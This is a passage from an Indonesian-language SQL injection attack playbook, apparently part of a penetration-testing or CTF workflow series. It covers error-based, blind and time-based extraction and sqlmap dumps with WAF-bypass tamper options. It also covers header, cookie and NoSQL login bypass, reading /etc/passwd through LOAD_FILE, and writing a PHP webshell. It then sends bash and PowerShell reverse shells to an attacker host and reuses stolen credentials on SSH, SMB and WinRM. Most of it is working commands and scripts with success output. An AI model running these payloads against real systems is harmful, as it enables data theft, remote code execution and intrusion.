    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 0),0x7e))-- -" \
    "$TARGET_URL/item"
```

**OUTPUT ✅:**

text

```
XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb~'
```

⚠️ **Perhatikan:** Output terpotong setelah ~32 karakter! Gunakan SUBSTRING untuk hash panjang:

Bash

```
# Ambil bagian kedua dari hash yang terpotong
curl -s --get \
    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,30),0x7e))-- -" \
    "$TARGET_URL/item"

curl -s --get \
    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),31,60),0x7e))-- -" \
    "$TARGET_URL/item"
```

---

### Langkah 3.2 — MSSQL Error-Based (CONVERT)

Bash

```
# MSSQL: paksa konversi tipe untuk trigger error berisi data
curl -s --get \
    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT DB_NAME()))-- -" \
    "$TARGET_URL/item"
```

**OUTPUT ✅:**

text

```
Conversion failed when converting the nvarchar value 'webapp' to data type int.
```

Bash

```
# Ekstrak tabel MSSQL
curl -s --get \
    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -" \
    "$TARGET_URL/item"

# Ambil tabel berikutnya (OFFSET equivalent di MSSQL)
curl -s --get \
    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN ('users')))-- -" \
    "$TARGET_URL/item"
```

---

### Langkah 3.3 — PostgreSQL Error-Based (CAST)

Bash

```
# PostgreSQL: cast ke integer untuk trigger error
curl -s --get \
    --data-urlencode "$PARAM=10 AND 1=CAST((SELECT current_database()) AS integer)-- -" \
    "$TARGET_URL/item"
```

**OUTPUT ✅:**

text

```
invalid input syntax for type integer: "appdb"
```

---

## ═══════════════════════════════════════

## FASE 4: BOOLEAN BLIND SQL INJECTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Tidak ada error/output terlihat, tapi TRUE vs FALSE response berbeda ukuran/isi

### Langkah 4.1 — Konfirmasi Boolean Blind

Bash

```
# Ambil baseline 3x untuk pastikan konsisten
for i in 1 2 3; do
    curl -s -o /dev/null -w "%{size_download}\n" "$INJECT_URL"
done

# TRUE test:
curl -s -o /dev/null -w "%{size_download}" \
    --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
echo " ← TRUE (AND 1=1)"

# FALSE test:
curl -s -o /dev/null -w "%{size_download}" \
    --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
echo " ← FALSE (AND 1=2)"
```

**OUTPUT BERHASIL ✅:**

text

```
14820 ← TRUE (AND 1=1)
421   ← FALSE (AND 1=2)
```

Bash

```
export TRUE_SIZE=14820
export FALSE_SIZE=421
echo "[+] Boolean Blind confirmed! TRUE=$TRUE_SIZE | FALSE=$FALSE_SIZE"
```

---

### Langkah 4.2 — Ekstrak Data via Boolean (Manual)

Bash

```
# Fungsi helper: cek apakah kondisi TRUE
check_true() {
    SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
        --get --data-urlencode "$PARAM=10 AND ($1)-- -" "$TARGET_URL/item")
    [[ "$SIZE" == "$TRUE_SIZE" ]] && echo "TRUE" || echo "FALSE"
}

# Test: apakah panjang nama database > 5?
check_true "LENGTH(database())>5"

# Test: apakah karakter pertama database adalah 's'?
check_true "SUBSTRING(database(),1,1)='s'"

# Binary search untuk karakter pertama (lebih efisien)
check_true "ASCII(SUBSTRING(database(),1,1))>100"   # > 100?
check_true "ASCII(SUBSTRING(database(),1,1))>110"   # > 110?
check_true "ASCII(SUBSTRING(database(),1,1))>115"   # > 115?
```

**Proses Binary Search:**

text

```
ASCII(char) > 100?  → TRUE  (char > 100)
ASCII(char) > 110?  → TRUE  (char > 110)
ASCII(char) > 115?  → FALSE (char ≤ 115)
ASCII(char) > 112?  → TRUE  (char > 112)
ASCII(char) > 113?  → TRUE  (char > 113)
ASCII(char) > 114?  → TRUE  (char > 114)
ASCII(char) > 115?  → FALSE
→ ASCII = 115 = 's'  ← karakter pertama adalah 's'
```

---

### Langkah 4.3 — Otomasi Boolean dengan Python Script

Bash

```
cat > ~/sqli_loot/boolean_blind.py << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Boolean Blind SQLi Extractor
Usage: python3 boolean_blind.py --url http://TARGET/item --param id --true-size 14820
"""
import argparse
import sys
import time
import requests

def is_true(session, url, param, payload, true_size, timeout=10):
    try:
        r = session.get(url, params={param: payload}, timeout=timeout)
        return len(r.content) == true_size
    except requests.RequestException as e:
        print(f"\n[!] Error: {e}", file=sys.stderr)
        return False

def extract_string(session, url, param, query, true_size, max_len=50):
    result = []
    print(f"[*] Extracting: {query}")
    
    # Cek panjang string dulu
    length = 0
    for i in range(1, max_len + 1):
        if is_true(session, url, param, f"10 AND LENGTH(({query}))>={i}-- -", true_size):
            length = i
        else:
            break
    
    if length == 0:
        print("[-] Could not determine length")
        return ""
    
    print(f"[*] Length: {length}")
    
    # Binary search per karakter
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"10 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            if is_true(session, url, param, payload, true_size):
                lo = mid + 1
            else:
                hi = mid - 1
        
        char = chr(lo)
        result.append(char)
        print(f"\r[+] Progress: {''.join(result)}", end="", flush=True)
        time.sleep(0.05)
    
    print()
    return "".join(result)

def main():
    parser = argparse.ArgumentParser(description="Boolean Blind SQLi Extractor")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Injectable parameter")
    parser.add_argument("--true-size", type=int, required=True, help="Response size when TRUE")
    parser.add_argument("--query", default="database()", help="SQL query to extract")
    args = parser.parse_args()
    
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    
    result = extract_string(session, args.url, args.param, args.query, args.true_size)
    print(f"[+] Result: {result}")

if __name__ == "__main__":
    main()
PYTHON_EOF

chmod +x ~/sqli_loot/boolean_blind.py

# Contoh penggunaan:
# Ekstrak nama database:
python3 ~/sqli_loot/boolean_blind.py \
    --url "http://$TARGET/item" \
    --param id \
    --true-size 14820 \
    --query "database()"

# Ekstrak tabel:
python3 ~/sqli_loot/boolean_blind.py \
    --url "http://$TARGET/item" \
    --param id \
    --true-size 14820 \
    --query "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"

# Ekstrak password admin:
python3 ~/sqli_loot/boolean_blind.py \
    --url "http://$TARGET/item" \
    --param id \
    --true-size 14820 \
    --query "SELECT password FROM users WHERE username='admin' LIMIT 1"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Extracting: database()
[*] Length: 6
[+] Progress: shopdb
[+] Result: shopdb
```

**OUTPUT GAGAL ❌ — Semua cek return FALSE:**

text

```
FALSE
FALSE
FALSE
FALSE
```

➡️ Syntax salah atau true_size salah. Verifikasi ulang:

Bash

```
# Debug: print size untuk berbagai payload
curl -s -o /dev/null -w "%{size_download}" --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
curl -s -o /dev/null -w "%{size_download}" --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
# Sesuaikan true_size dengan hasil di atas
```

---

## ═══════════════════════════════════════

## FASE 5: TIME-BASED BLIND SQL INJECTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Tidak ada perbedaan response sama sekali, tapi bisa paksa delay

### Langkah 5.1 — Konfirmasi Time-Based

Bash

```
# Ambil baseline timing dulu
echo "=== Baseline timing ==="
for i in 1 2 3; do
    time curl -s -o /dev/null "$INJECT_URL" 2>&1 | grep real
done

echo "=== Delay test - MySQL SLEEP(5) ==="
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"

echo "=== Delay test - MySQL conditional ==="
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND IF(1=1,SLEEP(5),0)-- -" "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — Ada delay ~5 detik:**

text

```
=== Baseline timing ===
real    0m0.115s
real    0m0.112s
real    0m0.118s

=== Delay test ===
real    0m5.134s    ← DELAY TERKONFIRMASI!
```

Bash

```
# Test per database jika MySQL tidak bekerja
# PostgreSQL:
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND 1=(SELECT 1 FROM pg_sleep(5))-- -" "$TARGET_URL/item"

# MSSQL:
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10; WAITFOR DELAY '00:00:05'-- -" "$TARGET_URL/item"

# Oracle:
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -" "$TARGET_URL/item"
```

---

### Langkah 5.2 — Ekstrak Data via Time-Based (Manual)

Bash

```
# Cek apakah karakter pertama database > 'm' (ASCII 109)
# MySQL: IF(condition, SLEEP(5), 0)
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -" \
    "$TARGET_URL/item"
```

**OUTPUT ✅ — Delay 5 detik = TRUE (karakter > 'm'):**

text

```
real    0m5.123s    ← TRUE
```

**OUTPUT ✅ — Tidak ada delay = FALSE:**

text

```
real    0m0.115s    ← FALSE
```

---

### Langkah 5.3 — Otomasi Time-Based dengan SQLMap

Bash

```
# SQLMap lebih baik untuk time-based karena handle timing otomatis
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    -p $PARAM \
    --technique=T \    # T = Time-based only
    --time-sec=5 \
    --dbs \
    --batch \
    --output-dir=~/sqli_loot/sqlmap_output/

# Setelah dapat DB name, dump tabel
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    -p $PARAM \
    --technique=T \
    -D shopdb \
    -T users \
    -C username,password \
    --dump \
    --batch
```

**OUTPUT BERHASIL ✅:**

text

```
[INFO] retrieved: shopdb
Database: shopdb
Table: users
[2 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| john     | 482c811da5d5b4bc6d497ffa98491e38 |
+----------+----------------------------------+
```

---

## ═══════════════════════════════════════

## FASE 6: SQLMAP — AUTOMATION WORKFLOW

## ═══════════════════════════════════════

> **Gunakan SQLMap SETELAH manual confirm ada SQLi. Jangan langsung pakai SQLMap.**

### Langkah 6.1 — Basic SQLMap Detection & Enumeration

Bash

```
# Step 1: Detection basic
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    -p $PARAM \
    --batch \
    --output-dir=~/sqli_loot/sqlmap_output/

# Step 2: Dengan cookies (jika butuh login)
# Pertama: login manual, capture cookie dari browser/Burp
export COOKIE="PHPSESSID=abc123def456"
sqlmap -u "$TARGET_URL/dashboard?id=1" \
    --cookie="$COOKIE" \
    --batch \
    --dbs

# Step 3: POST request
sqlmap -u "$TARGET_URL/search" \
    --data="query=test&category=all" \
    -p query \
    --batch \
    --dbs

# Step 4: Dari file request (PALING RELIABLE untuk kompleks)
# Cara: Di Burp → klik kanan request → Save item → simpan sebagai request.txt
sqlmap -r ~/sqli_loot/requests/request.txt \
    --batch \
    --dbs \
    --output-dir=~/sqli_loot/sqlmap_output/
```

---

### Langkah 6.2 — Full Enumeration Sequence

Bash

```
# Sequence lengkap setelah SQLi confirmed
DB_NAME_FOUND="shopdb"   # Ganti sesuai output

# 1. List semua database
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch --dbs

# 2. List tabel di database target
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch -D $DB_NAME_FOUND --tables

# 3. List kolom di tabel users
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
    -D $DB_NAME_FOUND -T users --columns

# 4. Dump data
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
    -D $DB_NAME_FOUND -T users \
    -C username,password \
    --dump

# 5. Dump semua data (hati-hati: bisa lambat)
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
    -D $DB_NAME_FOUND --dump-all
```

---

### Langkah 6.3 — SQLMap dengan WAF Bypass

Bash

```
# Jika dapat 403 atau WAF detected:
wafw00f $TARGET_URL

# Coba tamper scripts sesuai WAF:
# Space filter → space2comment
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --tamper=space2comment \
    --batch --dbs

# Random case
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --tamper=randomcase \
    --batch --dbs

# Kombinasi (urutan penting!)
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --tamper=space2comment,randomcase \
    --batch --dbs

# Level dan risk yang lebih tinggi (lebih agresif, lebih lambat)
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --level=3 --risk=2 \
    --batch --dbs
```

**OUTPUT BERHASIL ✅ — SQLMap detect:**

text

```
[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Type: time-based blind
    Type: UNION query
---
back-end DBMS: MySQL >= 5.0.12
```

**OUTPUT GAGAL ❌ — "all tested parameters do not appear to be injectable":**

text

```
[WARNING] GET parameter 'id' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable.
```

➡️ Tapi tadi manual injection berhasil! Kemungkinan:

1. Parameter salah → cek nama parameter
2. Butuh cookie → tambahkan `--cookie`
3. WAF blocking SQLMap → coba `--tamper`, `--random-agent`, `--tor`
4. Injeksi ada di header → tambahkan `--headers`

Bash

```
# Coba dengan random user agent
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --random-agent \
    --batch --dbs

# Tambahkan delay antara request (stealth)
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --delay=1 --random-agent \
    --batch --dbs
```

---

## ═══════════════════════════════════════

## FASE 7: SPECIAL CONTEXTS

## ═══════════════════════════════════════

### Langkah 7.1 — SQLi dalam Cookie

Bash

```
# Test cookie injection
curl -i "$TARGET_URL/profile" -H "Cookie: user=admin'"
curl -i "$TARGET_URL/profile" -H "Cookie: user=admin' AND 1=1-- -"
curl -i "$TARGET_URL/profile" -H "Cookie: user=admin' AND 1=2-- -"

# SQLMap dengan cookie injection
sqlmap -u "$TARGET_URL/profile" \
    --cookie="user=test" \
    -p user \
    --batch --dbs
```

**OUTPUT BERHASIL ✅ — Ukuran response berbeda:**

text

```
HTTP/1.1 200 OK
Content-Length: 14820     ← AND 1=1 (TRUE)

HTTP/1.1 200 OK  
Content-Length: 421       ← AND 1=2 (FALSE)
```

➡️ Cookie field `user` vulnerable! Lanjutkan extraction seperti biasa.

---

### Langkah 7.2 — SQLi dalam HTTP Header

Bash

```
# User-Agent injection (sering terjadi di logging)
curl -i "$TARGET_URL/" -H "User-Agent: test'"
curl -i "$TARGET_URL/" -H "User-Agent: test' AND 1=1-- -"

# X-Forwarded-For injection (sering di IP tracking/whitelist)
curl -i "$TARGET_URL/" -H "X-Forwarded-For: 10.0.0.1'"
curl -i "$TARGET_URL/" -H "X-Forwarded-For: 10.0.0.1' AND 1=1-- -"

# Referer injection
curl -i "$TARGET_URL/product" -H "Referer: http://google.com/'"

# SQLMap untuk header injection
sqlmap -u "$TARGET_URL/" \
    --headers="X-Forwarded-For: 10.0.0.1*" \
    --batch --dbs
```

---

### Langkah 7.3 — SQLi dalam JSON Body (API)

Bash

```
# Test dengan single quote di JSON value
curl -s -X POST "$TARGET_URL/api/search" \
    -H "Content-Type: application/json" \
    -d '{"search":"test'"'"'"}' | head -20

# Boolean test
curl -s -X POST "$TARGET_URL/api/item" \
    -H "Content-Type: application/json" \
    -d '{"id":"10 AND 1=1-- -"}' | wc -c

curl -s -X POST "$TARGET_URL/api/item" \
    -H "Content-Type: application/json" \
    -d '{"id":"10 AND 1=2-- -"}' | wc -c

# SQLMap dengan JSON body
# Cara terbaik: simpan request ke file
cat > ~/sqli_loot/requests/api_request.txt << 'EOF'
POST /api/search HTTP/1.1
Host: 10.10.11.200
Content-Type: application/json
Content-Length: 20

{"search":"test*"}
EOF

sqlmap -r ~/sqli_loot/requests/api_request.txt --batch --dbs
```

**OUTPUT BERHASIL ✅ — Size berbeda:**

text

```
14820    ← AND 1=1 (TRUE)
421      ← AND 1=2 (FALSE)
```

---

## ═══════════════════════════════════════

## FASE 8: SQL INJECTION TO RCE

## ═══════════════════════════════════════

> **Prasyarat:** Sudah dapat DB user, DB version, dan tahu web root path

### Langkah 8.1 — Cek Privilege File (MySQL)

Bash

```
# Cek apakah user DB punya FILE privilege
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT (SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(0x27,user(),0x27)),'B','C'-- -" \
    "$TARGET_URL/item"

# Cek secure_file_priv setting
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — Punya FILE privilege:**

HTML

```
<div class="product-name">SELECT,INSERT,UPDATE,DELETE,FILE,...</div>
```

**OUTPUT secure_file_priv ✅ — Kosong (tidak dibatasi):**

HTML

```
<div class="product-name"></div>    ← KOSONG = bisa tulis ke mana saja!
```

**OUTPUT secure_file_priv ❌ — Dibatasi:**

HTML

```
<div class="product-name">/var/lib/mysql-files/</div>    ← Hanya bisa tulis ke sini
```

---

### Langkah 8.2 — Cari Web Root Path

Bash

```
# Method 1: Baca file konfigurasi umum
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),'B','C'-- -" \
    "$TARGET_URL/item"

# Method 2: Baca file PHP yang sudah diketahui
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/var/www/html/index.php'),'B','C'-- -" \
    "$TARGET_URL/item"

# Method 3: Coba baca /etc/passwd untuk konfirmasi READ bekerja
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/passwd'),'B','C'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — Bisa baca /etc/passwd:**

HTML

```
<div class="product-name">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
</div>
```

➡️ FILE read bekerja! Web root kemungkinan `/var/www/html/`

---

### Langkah 8.3 — Upload Webshell

Bash

```
# Upload PHP webshell sederhana
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT '<?php if(isset(\$_REQUEST[\"cmd\"])){echo \"<pre>\".shell_exec(\$_REQUEST[\"cmd\"]).\"</pre>\";}?>','B','C' INTO OUTFILE '/var/www/html/shell.php'-- -" \
    "$TARGET_URL/item"

# Verifikasi webshell terupload
curl -s "http://$TARGET/shell.php"

# Test eksekusi command
curl -s "http://$TARGET/shell.php?cmd=id"
curl -s "http://$TARGET/shell.php?cmd=whoami"
curl -s "http://$TARGET/shell.php?cmd=cat+/etc/passwd"
```

**OUTPUT BERHASIL ✅ — Command execution:**

HTML

```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

➡️ **RCE VIA SQLi!** Upgrade ke reverse shell:

Bash

```
# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell
REVSHELL="bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
curl -s "http://$TARGET/shell.php?cmd=$REVSHELL"

# Atau pakai URL encoding yang lebih bersih
curl -s "http://$TARGET/shell.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

**OUTPUT BERHASIL ✅ — Reverse shell masuk:**

text

```
connect to [10.10.14.5] from 10.10.11.200:54321
www-data@web01:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ Dapat shell! Selanjutnya privilege escalation → ke **<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>**

**OUTPUT GAGAL ❌ — INTO OUTFILE gagal:**

HTML

```
<!-- Tidak ada output, atau error -->
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option
```

➡️ Coba path yang diizinkan atau gunakan SQLMap `--os-shell`:

Bash

```
sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
    --os-shell \
    --batch
```

---

### Langkah 8.4 — MSSQL xp_cmdshell

Bash

```
# Cek apakah xp_cmdshell tersedia
curl -s --get \
    --data-urlencode "$PARAM=1; EXEC xp_cmdshell 'whoami'-- -" \
    "$TARGET_URL/item"

# Jika disabled, coba enable (butuh sysadmin privilege)
curl -s --get \
    --data-urlencode "$PARAM=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -" \
    "$TARGET_URL/item"

# Setelah enable, jalankan command
curl -s --get \
    --data-urlencode "$PARAM=1; EXEC xp_cmdshell 'whoami'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅:**

text

```
nt service\mssqlserver
```

Bash

```
# Reverse shell via PowerShell (MSSQL/Windows)
# Setup listener dulu
nc -lvnp $LPORT &

# Command untuk download dan jalankan PowerShell reverse shell
PS_CMD='powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\"'"$LHOST"'\",'"$LPORT"');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$ss=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ss,0,$ss.Length);$s.Flush()};$c.Close()"'

curl -s --get \
    --data-urlencode "$PARAM=1; EXEC xp_cmdshell '$PS_CMD'-- -" \
    "$TARGET_URL/item"
```

---

## ═══════════════════════════════════════

## FASE 9: NOSQL INJECTION (MongoDB)

## ═══════════════════════════════════════

> **Masuk sini jika:** Target menggunakan Node.js/MongoDB (bukan SQL database)

### Langkah 9.1 — Deteksi NoSQL

Bash

```
# Cek indikasi MongoDB di response/headers
curl -s "$TARGET_URL" | grep -iE "(mongodb|mongoose|mongo)"
curl -s -I "$TARGET_URL" | grep -iE "(express|node)"

# Test login bypass dengan $ne operator
curl -s -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$ne":"invalid"}}' | head -20

# Bandingkan dengan request normal
curl -s -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}' | head -20
```

**OUTPUT BERHASIL ✅ — Login bypass dengan $ne:**

JSON

```
{"success":true,"token":"eyJ0eXAi...","redirect":"/dashboard"}
```

➡️ **NoSQL Injection berhasil!** Kita bypass autentikasi.

**OUTPUT dengan password salah:**

JSON

```
{"success":false,"message":"Invalid credentials"}
```

Bash

```
# Setelah bypass: gunakan token untuk akses admin
TOKEN="eyJ0eXAi..."
curl -s "$TARGET_URL/api/users" \
    -H "Authorization: Bearer $TOKEN"

# Atau coba $regex untuk enumerate username
curl -s -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}'
```

---

## ═══════════════════════════════════════

## FASE 10: WAF BYPASS

## ═══════════════════════════════════════

### Langkah 10.1 — Deteksi dan Identifikasi WAF

Bash

```
# Deteksi WAF
wafw00f $TARGET_URL

# Manual detection dari response header
curl -s -I "$TARGET_URL/item?id=10'" | grep -iE "(server|x-|via|cf-|sucuri)"

# Cek response code saat inject
curl -s -o /dev/null -w "%{http_code}" --get --data-urlencode "id=10'" "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — WAF terdeteksi:**

text

```
[+] The site is behind Cloudflare (Cloudflare)
```

atau:

text

```
HTTP: 403    ← WAF block
HTTP: 406    ← WAF block
HTTP: 429    ← Rate limit
```

---

### Langkah 10.2 — Bypass Techniques

Bash

```
# Technique 1: Case variation
curl -s --get --data-urlencode "id=10 UnIoN SeLeCt 1,2,3-- -" "$TARGET_URL/item" | wc -c

# Technique 2: Comment injection (MySQL)
curl -s --get --data-urlencode "id=10 /*!UNION*/ /*!SELECT*/ 1,2,3-- -" "$TARGET_URL/item" | wc -c

# Technique 3: Whitespace alternatives
curl -s --get --data-urlencode "id=10/**/UNION/**/SELECT/**/1,2,3-- -" "$TARGET_URL/item" | wc -c

# Technique 4: URL encoding ganda
# ' → %27 → %2527 (double encode)
curl -s "$TARGET_URL/item?id=10%2527" | wc -c

# Technique 5: Hex encoding string
# 'users' → 0x7573657273
curl -s --get \
    --data-urlencode "id=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=0x73686f7064622d- -" \
    "$TARGET_URL/item"

# SQLMap dengan berbagai tamper
sqlmap -u "$TARGET_URL/item?id=10" \
    --tamper=space2comment,randomcase,charencode \
    --random-agent \
    --delay=2 \
    --batch --dbs
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error/Situasi|Penyebab|Solusi|
|---|---|---|
|Single quote tidak trigger error|Error disembunyikan / tidak ada SQLi|Coba boolean blind test|
|UNION error "column mismatch"|Jumlah kolom salah|Ulangi ORDER BY dari 1|
|UNION berhasil tapi data tidak muncul|ID yang ada override inject|Gunakan id=0 atau id=99999|
|GROUP_CONCAT terpotong|Batas panjang default 1024|Tambah `GROUP_CONCAT(... ORDER BY 1 SEPARATOR ',')` atau pakai LIMIT|
|SQLMap tidak detect|Parameter tidak injectable / perlu cookie|Verifikasi manual dulu, tambahkan `--cookie`|
|`AND 1=1` dan `AND 1=2` sama ukurannya|Aplikasi tidak pakai kondisi itu|Coba: `AND '1'='1` (string context) atau time-based|
|SLEEP tidak delay|Wrong DB, syntax salah|Test semua sleep function per DB|
|INTO OUTFILE gagal|`secure_file_priv` atau permission|Cek setting, coba path lain, atau gunakan `--os-shell`|
|403 di semua payload|WAF blocking|Gunakan tamper scripts, encoding, atau manual bypass|
|Payload dipotong/disanitize|Input filtering|Coba encoding berbeda, hex, atau bypass karakter|
|Time-based tidak reliable|Network latency tinggi|Naikkan delay ke 10 detik, test di waktu berbeda|
|Google search hint|`site:hacktricks.xyz sql injection [DB_TYPE]`|Spesifik cari per database type|
|Stuck di boolean blind|Terlalu lambat manual|Gunakan script python atau SQLMap `--technique=B`|
|Response selalu sama|Aplikasi cached / parameter tidak dipakai|Test parameter lain, test dengan Burp|

---

## ═══════════════════════════════════════

## CROSS-SERVICE: SETELAH DAPAT CREDENTIAL

## ═══════════════════════════════════════

Bash

```
# Setiap kali dapat username:password dari SQLi, test ke service lain!

export USER="admin"
export PASS="password123"

# Web Login
curl -s -X POST "$TARGET_URL/login" \
    -d "username=$USER&password=$PASS" -L | grep -iE "(dashboard|welcome|logout)"

# SSH
nxc ssh $TARGET -u "$USER" -p "$PASS"
ssh "$USER@$TARGET"               # → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>

# FTP
nxc ftp $TARGET -u "$USER" -p "$PASS"  # → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>

# SMB
nxc smb $TARGET -u "$USER" -p "$PASS"  # → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>

# Database direct access
mysql -h $TARGET -u "$USER" -p"$PASS"  # → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>

# WinRM (Windows)
nxc winrm $TARGET -u "$USER" -p "$PASS"
evil-winrm -i $TARGET -u "$USER" -p "$PASS"
```

**Diagram Cross-Service:**

text

```
SQLi Credentials Found
          │
          ├──→ Web Admin Panel   → Upload webshell / template injection
          ├──→ Port 22  (SSH)    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
          ├──→ Port 21  (FTP)    → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
          ├──→ Port 445 (SMB)    → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
          ├──→ Port 3306 (MySQL) → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
          ├──→ Port 5985 (WinRM) → evil-winrm
          └──→ Hash cracking     → <a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

text

```
START: Ditemukan Input Parameter (GET/POST/Cookie/Header)
│
├─ FASE 0: Reconnaissance
│   └─ Identifikasi parameter, ambil baseline
│
├─ FASE 1: Detection
